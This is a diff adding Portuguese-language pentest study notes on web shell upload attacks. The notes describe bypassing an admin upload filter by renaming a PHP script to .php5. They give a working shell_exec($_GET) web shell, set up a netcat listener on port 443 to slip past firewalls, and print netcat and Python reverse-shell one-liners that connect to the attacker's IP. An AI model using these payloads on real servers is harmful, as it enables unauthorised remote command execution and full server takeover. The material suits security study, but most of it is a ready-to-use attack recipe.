@@ -1,0 +1,56 @@
+WEB SHELL // SHELL UPLOAD
+
+-> É uma forma maliciosa de realizar upload de um arquivo em um servidor web
+-> Ao seu realizado o upload de tal arquivo (que é um script, por exemplo, em php), que se aproveita de uma vulnerabilidade
+em um formulário de upload de arquivo, esse script é executado no servidor e permite ao invasor ter acesso à informações privilegiadas e,
+até mesmo, controlar o sistema operacional do servidor (inclusive instalar malwares, etc)
+
+-> linguagens usadas: php, python, ruby, asp.net ...
+___________________________________________________________________________________________________________________________________________________________
+
+EXEMPLO DE CASO
+
+-> contexto: /admin de uma aplicação, existe um formulário para fazer upload de um arquivo
+
+    1) TENTANDO ENVIAR O SCRIPT ***
+    -> crio um arquivo .php (a aplicação bloqueia pois não é permitido)
+    -> passo o script do .php para um arquivo com extensao .jpeg.php para tentar driblar (mas ainda é bloqueado)
+    -> passo o script do .jpeg.php para um arquivo c extensao .php5 que geralmente esquecem de filtrar (e funciona)
+        -> <?php
+                echo shell_exec('ls'); // vai dar um ls
+            ?>
+
+            <?php
+                echo shell_exec($_GET["comando"]) // isso faz com que possamos executar comando diferentes atraves da url
+            ?>
+                -> * faço upload do script.php5 *
+                -> clico na url que ele se encontra
+                    -> aplicacao.com/admin/uploads/script.php5
+                -> agora posso passar um "?comando-que-eu-quiser"
+                    -> aplicacao.com/admin/uploads/scirpt.php5?comando=ls
+                    -> vai rodar um ls
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+    2) CRIANDO O SERVIDOR PARA CONEXÃO
+    -> vou no NAT da minha rede e habilito uma porta x (EX: 443) para ficar escutando e servir de servidor para conexões externas
+        -> ifconfig para saber o ip privado e entro para configurar
+    -> agora: nc -lvp 443 (MEU TERMINAL)
+    ->  meuip.com.br para pegar o ip publico (que vai servir para passar de parametro para conexao atraves da web shell) (ex: 000.000.000.111)
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+    3.1) CONECTANDO (SHELL REVERSA USANDO NETCAT)
+    -> nc 000.000.000.111 443 {{ aplicacao.com/admin/uploads/scirpt.php5?comando=nc 000.000.000.111 443 }}
+        -> pronto agora há uma conexão entre o servidor da aplicação e o seu sistema
+    -> nc -e /bin/bash 000.000.000.111 443
+        -> OBS: usar a porta 80 ou 443 é bom pq o webfirewall nao barra, ja que acredita que está fazendo uma conexao com um site
+        -> pronto, agora há uma conexaoao entre o servidor da aplicação e o seu sistema, mas, com voce executando um shell reverso
+        -> é muito difícil funcionar pois o netcat para servidores muitas vezes nao tem a opção "-e"
+        -> pode-se executar, então, uma tentativa de shell reversa com um código python
+            -> pentestmonkey. net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+    3.2) CONECTANDO (SHELL REVERSA USANDO PYTHON)
+    -> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("000.000.000.111",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
